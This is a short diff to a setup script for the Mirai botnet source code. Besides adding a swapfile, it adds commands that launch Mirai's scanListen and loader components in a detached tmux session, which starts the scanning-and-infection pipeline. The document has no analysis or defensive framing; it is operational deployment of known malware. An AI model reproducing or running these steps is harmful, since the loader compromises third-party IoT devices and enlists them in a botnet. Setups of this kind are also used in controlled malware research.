@@ -187,6 +187,16 @@ cd /root/Mirai-Source-Code/loader/
 
 route del default
 
+# create swapfile
+dd if=/dev/zero of=/swapfile bs=4M count=1250
+mkswap /swapfile
+chmod 600 /swapfile
+swapon /swapfile
+echo /swapfile swap swap defaults 0 0 >> /etc/fstab
+
+# start scan
+cd /root/Mirai-Source-Code/loader/
+tmux new-session -d -s scan "../mirai/debug/scanListen | ./loader.dbg"
 
 
 
